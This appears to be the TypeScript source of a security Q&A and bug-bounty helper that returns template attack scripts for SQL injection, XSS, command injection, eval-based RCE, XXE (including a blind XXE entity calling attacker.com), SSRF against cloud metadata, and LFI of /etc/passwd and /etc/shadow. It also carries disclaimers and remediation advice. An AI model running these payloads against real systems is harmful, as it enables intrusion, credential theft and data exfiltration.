/**
 * UNIFIED Q&A ENGINE
 *
 * Consolidates KnowledgeQAEngine, CodeGenerationEngine, and SecurityKnowledgeBase
 * into a single, efficient Q&A system with integrated security knowledge, code generation,
 * and vulnerability information.
 *
 * Handles:
 * - Security vulnerability knowledge Q&A
 * - Exploit payload and test script generation
 * - CVE lookups and threat intelligence
 * - HackerOne program matching
 * - Mitigation and remediation advice
 */

import { securityKnowledgeBase } from './SecurityKnowledgeBase';

export interface QAResponse {
  answer: string;
  confidence: number;
  type: 'knowledge' | 'generated_code' | 'explanation' | 'guidance';
  sources: string[];
  relatedTopics: string[];
  followUpQuestions?: string[];
  code?: {
    language: string;
    content: string;
    explanation: string;
    usage: string;
    security_notes: string[];
  };
}

export class UnifiedQAEngine {
  private knowledgeBase = securityKnowledgeBase;

  /**
   * Process Q&A query - unified entry point
   */
  async answer(query: string): Promise<QAResponse> {
    const startTime = Date.now();
    const intent = this.detectIntent(query);
    const keywords = this.extractKeywords(query);

    let response: QAResponse;

    switch (intent) {
      case 'generate-code':
        response = this.handleCodeGeneration(query, keywords);
        break;
      case 'vulnerability-info':
        response = this.handleVulnerabilityQuestion(query, keywords);
        break;
      case 'cve-lookup':
        response = this.handleCVEQuestion(query, keywords);
        break;
      case 'exploit-info':
        response = this.handleExploitQuestion(query, keywords);
        break;
      case 'mitigation':
        response = this.handleMitigationQuestion(query, keywords);
        break;
      case 'hackerone':
        response = this.handleHackerOneQuestion(query, keywords);
        break;
      default:
        response = this.handleGeneralQuestion(query, keywords);
    }

    const executionTime = Date.now() - startTime;
    console.log(`[UnifiedQA] ⚡ Answered in ${executionTime}ms (type: ${response.type}, confidence: ${(response.confidence * 100).toFixed(0)}%)`);

    return response;
  }

  /**
   * Detect user intent from query
   */
  private detectIntent(query: string): string {
    query = query.toLowerCase();

    if (query.includes('generate') || query.includes('create') || query.includes('script') ||
        query.includes('poc') || query.includes('payload') || query.includes('exploit script')) {
      return 'generate-code';
    }
    if (query.includes('cve') || query.match(/\d{4}-\d{4}/)) {
      return 'cve-lookup';
    }
    if (query.includes('exploit') && !query.includes('script') && !query.includes('generate')) {
      return 'exploit-info';
    }
    if (query.includes('how to') || query.includes('fix') || query.includes('mitigate') || query.includes('prevent')) {
      return 'mitigation';
    }
    if (query.includes('hackerone') || query.includes('bug bounty') || query.includes('program')) {
      return 'hackerone';
    }
    if (query.includes('what') || query.includes('explain') || query.includes('vulnerability') ||
        query.includes('xss') || query.includes('sql')) {
      return 'vulnerability-info';
    }

    return 'general';
  }

  /**
   * Extract keywords from query
   */
  private extractKeywords(query: string): string[] {
    const words = query.toLowerCase()
      .split(/[^a-z0-9\-]/g)
      .filter(w => w.length > 2);
    return [...new Set(words)];
  }

  /**
   * Handle code generation requests
   */
  private handleCodeGeneration(query: string, keywords: string[]): QAResponse {
    const vulnType = this.detectVulnerabilityType(query);
    const code = this.generateCode(vulnType, query);

    return {
      answer: `I've generated a ${code.language} testing script for you.`,
      confidence: 0.9,
      type: 'generated_code',
      sources: ['code-generation-engine'],
      relatedTopics: this.getRelatedTopics(vulnType),
      code: {
        language: code.language,
        content: code.content,
        explanation: code.explanation,
        usage: code.usage,
        security_notes: code.security_notes || [
          'Only use on systems you own or have explicit permission to test',
          'This is for educational and authorized penetration testing only',
          'Always follow responsible disclosure practices'
        ]
      },
      followUpQuestions: [
        `How do I detect ${vulnType}?`,
        `What's the mitigation for ${vulnType}?`,
        'Can you explain this vulnerability in detail?'
      ]
    };
  }

  /**
   * Handle vulnerability information requests
   */
  private handleVulnerabilityQuestion(query: string, keywords: string[]): QAResponse {
    const vulnerabilities = this.knowledgeBase.getAllVulnerabilityTypes()
      .filter(type => keywords.some(kw => type.includes(kw) || kw.includes(type.substring(0, 3))));

    if (vulnerabilities.length === 0) {
      return {
        answer: 'I couldn\'t find information about that specific vulnerability. Ask about SQL Injection, XSS, CSRF, Command Injection, RCE, LFI, XXE, SSRF, or IDOR.',
        confidence: 0.3,
        type: 'explanation',
        sources: [],
        relatedTopics: this.knowledgeBase.getAllVulnerabilityTypes().slice(0, 5)
      };
    }

    let fullAnswer = '';
    const sources: string[] = [];

    vulnerabilities.forEach((vulnType, index) => {
      const vuln = this.knowledgeBase.getVulnerability(vulnType);
      if (vuln) {
        fullAnswer += `\n**${vuln.type}**\n${vuln.description}\n`;
        fullAnswer += `\nExamples: ${vuln.examples.slice(0, 2).join(', ')}\n`;
        fullAnswer += `Severity: ${vuln.severity.toUpperCase()}\n`;
        fullAnswer += `Remediation: ${vuln.remediation}\n`;
        sources.push(vulnType);

        if (index < vulnerabilities.length - 1) {
          fullAnswer += '\n---\n';
        }
      }
    });

    const relatedTopics = vulnerabilities
      .flatMap(type => this.knowledgeBase.getRelatedTopics(type))
      .filter(t => !vulnerabilities.includes(t))
      .slice(0, 3);

    return {
      answer: fullAnswer,
      confidence: Math.min(0.95, 0.7 + vulnerabilities.length * 0.1),
      type: 'explanation',
      sources,
      relatedTopics,
      followUpQuestions: [
        `How can I test for ${vulnerabilities[0]}?`,
        `What's the mitigation for ${vulnerabilities[0]}?`,
        `Generate a test script for ${vulnerabilities[0]}`
      ]
    };
  }

  /**
   * Handle CVE lookup requests
   */
  private handleCVEQuestion(query: string, keywords: string[]): QAResponse {
    const searchTerm = keywords.join(' ') || query;
    const cves = this.knowledgeBase.searchCVEs(searchTerm);

    if (cves.length === 0) {
      return {
        answer: 'No CVEs found matching that search. Known CVEs include: CVE-2021-44228 (Log4j), CVE-2017-5638 (Struts), CVE-2018-8999 (ColdFusion)',
        confidence: 0.4,
        type: 'knowledge',
        sources: [],
        relatedTopics: []
      };
    }

    let answer = `Found ${cves.length} CVE(s):\n\n`;
    cves.forEach((cve, index) => {
      answer += `**${cve.id}** - CVSS ${cve.cvss}\n`;
      answer += `Software: ${cve.affected_software.join(', ')}\n`;
      answer += `Description: ${cve.description}\n`;
      answer += `Exploitation Difficulty: ${cve.exploitation_difficulty}\n`;
      answer += `Impact: ${cve.impact}\n`;
      answer += `Mitigation: ${cve.mitigation}\n`;

      if (index < cves.length - 1) {
        answer += '\n---\n';
      }
    });

    return {
      answer,
      confidence: 0.9,
      type: 'knowledge',
      sources: cves.map(c => c.id),
      relatedTopics: []
    };
  }

  /**
   * Handle exploit information requests
   */
  private handleExploitQuestion(query: string, keywords: string[]): QAResponse {
    const vulnerabilities = this.knowledgeBase.getAllVulnerabilityTypes()
      .filter(type => keywords.some(kw => type.includes(kw)));

    if (vulnerabilities.length === 0) {
      return {
        answer: 'Exploit information available for: SQL Injection, XSS, Command Injection, RCE, XXE, SSRF. Please specify a vulnerability type.',
        confidence: 0.3,
        type: 'guidance',
        sources: [],
        relatedTopics: []
      };
    }

    let answer = 'Exploit Information:\n\n';

    vulnerabilities.forEach((vulnType, index) => {
      const vuln = this.knowledgeBase.getVulnerability(vulnType);
      if (vuln && vuln.examples && vuln.examples.length > 0) {
        answer += `**${vuln.type}**\n`;
        answer += 'Example payloads:\n';
        vuln.examples.forEach(ex => {
          answer += `- \`${ex}\`\n`;
        });
        answer += `Detection: ${vuln.detection_methods.slice(0, 2).join(', ')}\n`;

        if (index < vulnerabilities.length - 1) {
          answer += '\n';
        }
      }
    });

    return {
      answer,
      confidence: 0.85,
      type: 'guidance',
      sources: vulnerabilities,
      relatedTopics: vulnerabilities
    };
  }

  /**
   * Handle mitigation/remediation requests
   */
  private handleMitigationQuestion(query: string, keywords: string[]): QAResponse {
    const vulnerabilities = this.knowledgeBase.getAllVulnerabilityTypes()
      .filter(type => keywords.some(kw => type.includes(kw) || kw.includes(type.substring(0, 3))));

    if (vulnerabilities.length === 0) {
      return {
        answer: 'To provide mitigation advice, specify a vulnerability type: SQL Injection, XSS, CSRF, Command Injection, RCE, LFI, XXE, or SSRF.',
        confidence: 0.2,
        type: 'guidance',
        sources: [],
        relatedTopics: []
      };
    }

    let answer = 'Mitigation Strategies:\n\n';

    vulnerabilities.forEach(vulnType => {
      const vuln = this.knowledgeBase.getVulnerability(vulnType);
      if (vuln) {
        answer += `**${vuln.type}**\n`;
        answer += `${vuln.remediation}\n\n`;
      }
    });

    return {
      answer,
      confidence: 0.9,
      type: 'guidance',
      sources: vulnerabilities,
      relatedTopics: vulnerabilities
    };
  }

  /**
   * Handle HackerOne program questions
   */
  private handleHackerOneQuestion(query: string, keywords: string[]): QAResponse {
    const vulnerabilities = this.knowledgeBase.getAllVulnerabilityTypes()
      .filter(type => keywords.some(kw => type.includes(kw)));

    if (vulnerabilities.length > 0) {
      const programs = vulnerabilities
        .flatMap(type => this.knowledgeBase.getApplicablePrograms(type))
        .filter((p, i, arr) => arr.findIndex(x => x.id === p.id) === i);

      if (programs.length > 0) {
        let answer = `HackerOne programs that accept ${vulnerabilities.join(', ')} reports:\n\n`;
        programs.forEach(program => {
          answer += `**${program.name}** (ID: ${program.id})\n`;
          answer += `Bounty Range: $${program.bounty_range[0]} - $${program.bounty_range[1]}\n`;
          answer += `Response Target: ${program.response_target_days} days\n`;
          answer += `Scope: ${program.scope.slice(0, 2).join(', ')}\n\n`;
        });

        return {
          answer,
          confidence: 0.95,
          type: 'knowledge',
          sources: programs.map(p => `program:${p.id}`),
          relatedTopics: vulnerabilities
        };
      }
    }

    return {
      answer: 'No specific programs found for that vulnerability type. Major programs include Google, Microsoft, and Facebook.',
      confidence: 0.4,
      type: 'guidance',
      sources: [],
      relatedTopics: []
    };
  }

  /**
   * Handle general questions
   */
  private handleGeneralQuestion(query: string, keywords: string[]): QAResponse {
    const vulnerabilityTypes = this.knowledgeBase.getAllVulnerabilityTypes();
    const relevantTypes = vulnerabilityTypes.filter(type =>
      keywords.some(kw => type.includes(kw) || kw.includes(type.substring(0, 3)))
    );

    if (relevantTypes.length > 0) {
      return {
        answer: `I can help you understand security vulnerabilities. I have information about: ${relevantTypes.join(', ')}. Please ask a specific question about any of these.`,
        confidence: 0.6,
        type: 'guidance',
        sources: [],
        relatedTopics: relevantTypes
      };
    }

    return {
      answer: `I'm specialized in security Q&A. I can help with: vulnerability types, CVEs, exploitation techniques, mitigation strategies, HackerOne programs, and security testing. What would you like to know?`,
      confidence: 0.5,
      type: 'guidance',
      sources: [],
      relatedTopics: vulnerabilityTypes.slice(0, 5)
    };
  }

  /**
   * Detect vulnerability type from query
   */
  private detectVulnerabilityType(query: string): string {
    query = query.toLowerCase();

    if (query.includes('sql')) return 'sql-injection';
    if (query.includes('xss') || query.includes('cross-site')) return 'xss';
    if (query.includes('command') || query.includes('os')) return 'command-injection';
    if (query.includes('rce') || query.includes('remote code')) return 'rce';
    if (query.includes('xxe')) return 'xxe';
    if (query.includes('ssrf')) return 'ssrf';
    if (query.includes('lfi') || query.includes('file')) return 'lfi';

    return 'generic';
  }

  /**
   * Generate code for given vulnerability type
   */
  private generateCode(vulnType: string, query: string): {
    language: string;
    content: string;
    explanation: string;
    usage: string;
    security_notes?: string[];
  } {
    switch (vulnType) {
      case 'sql-injection':
        return this.generateSQLiCode(query);
      case 'xss':
        return this.generateXSSCode(query);
      case 'command-injection':
        return this.generateCommandInjectionCode(query);
      case 'rce':
        return this.generateRCECode(query);
      case 'xxe':
        return this.generateXXECode(query);
      case 'ssrf':
        return this.generateSSRFCode(query);
      case 'lfi':
        return this.generateLFICode(query);
      default:
        return this.generateGenericTestCode(query);
    }
  }

  /**
   * Code generation helpers
   */
  private generateSQLiCode(query: string) {
    const database = query.includes('mysql') ? 'mysql' :
                    query.includes('postgres') ? 'postgresql' :
                    query.includes('mssql') ? 'mssql' : 'generic';

    const payloads: { [key: string]: string } = {
      mysql: `' OR '1'='1\n' UNION SELECT user(), database(), version()--\n' AND 1=2 UNION SELECT @@version--`,
      postgresql: `' OR '1'='1\n' UNION SELECT version()--\n' AND 1=2 UNION SELECT current_user--`,
      mssql: `' OR '1'='1\n' UNION SELECT @@version--\n' AND 1=2 UNION SELECT @@servername--`,
      generic: `' OR '1'='1\n" OR "1"="1\n1 UNION SELECT NULL--\n1' AND '1'='1`
    };

    const code = `# SQL Injection Tester - ${database.toUpperCase()}
import requests

TARGET = "http://target.com/api/search"
PAYLOADS = [
${payloads[database].split('\n').map(p => `    "${p}",`).join('\n')}
]

def test_sqli():
    for payload in PAYLOADS:
        params = {"q": payload}
        try:
            resp = requests.get(TARGET, params=params, timeout=5)
            error_indicators = ["SQL syntax", "mysql_fetch", "OracleError", "Unclosed quotation"]
            for indicator in error_indicators:
                if indicator in resp.text:
                    print(f"[+] Potential SQLi found: {payload}")
                    return True
        except Exception as e:
            print(f"[-] Error: {e}")
    return False

if __name__ == "__main__":
    if test_sqli():
        print("[+] Target appears vulnerable to SQL Injection")
    else:
        print("[-] No SQL Injection vulnerability detected")`;

    return {
      language: 'python',
      content: code,
      explanation: `SQL Injection payloads for ${database} databases. Tests boolean-based, UNION-based, and error-based SQLi.`,
      usage: 'Replace TARGET with your test URL. Run with: python3 sqli_test.py',
      security_notes: [
        'Only use on systems you own or have permission to test',
        'This is for educational purposes only',
        'Use in legitimate penetration tests only'
      ]
    };
  }

  private generateXSSCode(query: string) {
    return {
      language: 'html',
      content: `<!-- XSS Payload Tester -->
<h1>XSS Testing Payloads</h1>

<!-- Reflected XSS -->
<pre>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
<iframe src="javascript:alert('XSS')"></iframe>
<input onfocus="alert('XSS')" autofocus>
</pre>

<!-- Stored XSS Test -->
<form action="/comment" method="POST">
  <input type="text" name="comment" value="<img src=x onerror='alert(\"Stored XSS\")'>">
  <input type="submit" value="Test">
</form>`,
      explanation: 'XSS payload collection including reflected, stored, and DOM-based XSS vectors.',
      usage: 'Test each payload in different input fields. Watch browser console for alert() execution.',
      security_notes: [
        'Only test on applications you own or have explicit permission to test',
        'Never submit these to unauthorized systems',
        'Use with proper security testing framework'
      ]
    };
  }

  private generateCommandInjectionCode(query: string) {
    return {
      language: 'bash',
      content: `#!/bin/bash
TARGET="http://target.com/api/execute"

PAYLOADS=(
    "; id"
    "| whoami"
    "\`id\`"
    "\$(whoami)"
)

for payload in "\${PAYLOADS[@]}"; do
    echo "[*] Testing: $payload"
    response=$(curl -s "$TARGET?cmd=test$payload" 2>&1)
    if echo "$response" | grep -qE "uid=|root"; then
        echo "[+] VULNERABLE: $payload"
        exit 0
    fi
done`,
      explanation: 'Command injection tester using curl. Tests common command injection patterns.',
      usage: 'Modify TARGET. Run with: bash test_command_injection.sh',
      security_notes: ['Only use on authorized targets', 'Command injection can lead to full system compromise']
    };
  }

  private generateRCECode(query: string) {
    return {
      language: 'python',
      content: `#!/usr/bin/env python3
import requests

TARGET = "http://target.com/api/eval"

RCE_VECTORS = [
    {"payload": "__import__('os').system('id')", "type": "python-eval"},
    {"payload": "require('child_process').execSync('id')", "type": "node-eval"},
]

for vector in RCE_VECTORS:
    try:
        resp = requests.post(TARGET, data={"code": vector["payload"]}, timeout=5)
        if "uid=" in resp.text:
            print(f"[+] VULNERABLE via {vector['type']}!")
    except Exception as e:
        print(f"[-] Error: {e}")`,
      explanation: 'RCE tester for common eval vectors (Python, Node.js, Java).',
      usage: 'Modify TARGET. Run with: python3 test_rce.py',
      security_notes: ['RCE is critical severity', 'Only test on systems with explicit permission']
    };
  }

  private generateXXECode(query: string) {
    return {
      language: 'xml',
      content: `<?xml version="1.0"?>
<!-- XXE Injection Payloads -->

<!-- Basic XXE - File Disclosure -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<test>&xxe;</test>

<!-- Blind XXE -->
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "http://attacker.com/exfil?data=test">
]>
<foo>&xxe;</foo>

<!-- XXE Billion Laughs (DoS) -->
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
]>
<lolz>&lol2;</lolz>`,
      explanation: 'XXE injection payload collection including file disclosure, blind XXE, and DoS vectors.',
      usage: 'Send these XML payloads to endpoints that parse XML. Monitor responses for file contents.',
      security_notes: ['XXE can lead to file disclosure and RCE', 'Only test on authorized systems']
    };
  }

  private generateSSRFCode(query: string) {
    return {
      language: 'python',
      content: `#!/usr/bin/env python3
import requests
import time

TARGET = "http://target.com/api/fetch"

INTERNAL_TARGETS = [
    "http://localhost:8080/admin",
    "http://127.0.0.1:3306/",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/",
    "file:///etc/passwd",
]

for target_url in INTERNAL_TARGETS:
    try:
        resp = requests.get(TARGET, params={"url": target_url}, timeout=5)
        if resp.status_code == 200 and any(kw in resp.text for kw in ["root", "metadata"]):
            print(f"[+] VULNERABLE! Retrieved: {target_url}")
    except:
        pass
    time.sleep(0.5)`,
      explanation: 'SSRF tester for internal service and cloud metadata endpoint access.',
      usage: 'Modify TARGET. Run with: python3 test_ssrf.py',
      security_notes: ['SSRF can expose internal services and cloud credentials']
    };
  }

  private generateLFICode(query: string) {
    return {
      language: 'python',
      content: `#!/usr/bin/env python3
import requests

TARGET = "http://target.com/page.php"

FILES_TO_TEST = {
    "linux": ["/etc/passwd", "/etc/shadow", "/proc/self/environ"],
    "windows": ["C:\\\\windows\\\\win.ini", "C:\\\\boot.ini"],
}

LFI_WRAPPERS = ["{file}", "file://{file}", "../{file}", "../../{file}"]

for os_type, files in FILES_TO_TEST.items():
    for file_path in files:
        for wrapper in LFI_WRAPPERS:
            payload = wrapper.format(file=file_path)
            try:
                resp = requests.get(TARGET, params={"page": payload}, timeout=5)
                if any(ind in resp.text for ind in ["root:", "Administrator"]):
                    print(f"[+] VULNERABLE! Retrieved: {file_path}")
            except:
                pass`,
      explanation: 'LFI tester for path traversal and sensitive file access.',
      usage: 'Modify TARGET. Run with: python3 test_lfi.py',
      security_notes: ['LFI can expose configuration files and credentials']
    };
  }

  private generateGenericTestCode(query: string) {
    return {
      language: 'python',
      content: `#!/usr/bin/env python3
import requests

TARGET = "http://target.com/api/test"

def test_basic_endpoints():
    endpoints = ["/api/admin", "/api/users", "/api/debug", "/config"]
    for endpoint in endpoints:
        try:
            resp = requests.get(TARGET.replace("/api/test", endpoint), timeout=5)
            print(f"{endpoint}: {resp.status_code}")
            if any(kw in resp.text.lower() for kw in ["password", "token", "api_key"]):
                print(f"[!] Sensitive data exposed: {endpoint}")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    test_basic_endpoints()`,
      explanation: 'Generic security test script for endpoint enumeration and sensitive data detection.',
      usage: 'Modify TARGET and endpoints. Run with: python3 test_generic.py',
      security_notes: ['For educational purposes and authorized testing only']
    };
  }

  /**
   * Generate security assessment checklist
   */
  generateAssessmentChecklist(target: string): {
    code: string;
    language: string;
    explanation: string;
    usage: string;
  } {
    const checklist = `# Security Assessment Checklist for ${target}

## Phase 1: Reconnaissance (2-4 hours)
- [ ] DNS enumeration and subdomain discovery
- [ ] WHOIS lookup and domain information
- [ ] SSL/TLS certificate analysis
- [ ] Technology fingerprinting
- [ ] Git repository discovery

## Phase 2: Scanning & Enumeration (4-8 hours)
- [ ] Port scanning (nmap)
- [ ] Service version detection
- [ ] Directory/file enumeration (gobuster, ffuf)
- [ ] API endpoint discovery
- [ ] Virtual host enumeration

## Phase 3: Vulnerability Assessment (8-16 hours)
### Input Validation Testing
- [ ] SQL Injection (Union, Boolean Blind, Time-Based)
- [ ] Command Injection
- [ ] XXE Injection
- [ ] NoSQL Injection

### Authentication & Authorization
- [ ] Default credentials testing
- [ ] Weak password policies
- [ ] Account enumeration
- [ ] Session management flaws
- [ ] IDOR vulnerabilities

### Client-Side Testing
- [ ] Reflected XSS
- [ ] Stored XSS
- [ ] DOM-based XSS
- [ ] CSRF protection bypass
- [ ] Clickjacking

## Phase 4: Exploitation & Verification (4-12 hours)
- [ ] Generate proof-of-concept exploits
- [ ] Document exploitation steps
- [ ] Measure business impact
- [ ] Test privilege escalation

## Phase 5: Reporting (2-4 hours)
- [ ] Document all findings
- [ ] Create executive summary
- [ ] Provide remediation guidance
- [ ] Estimate risk ratings (CVSS)

## Critical Success Factors
- [ ] Documented proof of exploitation
- [ ] Clear business impact statement
- [ ] Reproducible vulnerability details
- [ ] Remediation recommendations`;

    return {
      code: checklist,
      language: 'markdown',
      explanation: 'Comprehensive security assessment checklist covering reconnaissance, scanning, vulnerability assessment, and reporting phases.',
      usage: 'Use as guide for structured vulnerability assessment. Track progress with checkboxes.'
    };
  }

  /**
   * Get related topics for a vulnerability
   */
  private getRelatedTopics(vulnType: string): string[] {
    const topicMap: { [key: string]: string[] } = {
      'sql-injection': ['parameterized-queries', 'input-validation', 'orm-frameworks'],
      'xss': ['content-security-policy', 'output-encoding', 'dom-manipulation'],
      'command-injection': ['input-validation', 'parameterization', 'shell-escaping'],
      'rce': ['code-injection', 'deserialization', 'unsafe-eval'],
      'xxe': ['xml-parsing', 'entity-resolution', 'dtd-processing'],
      'ssrf': ['network-segmentation', 'url-validation', 'proxy-controls'],
      'lfi': ['path-traversal', 'file-access-control', 'input-validation'],
    };

    return topicMap[vulnType] || [];
  }
}

export const unifiedQAEngine = new UnifiedQAEngine();
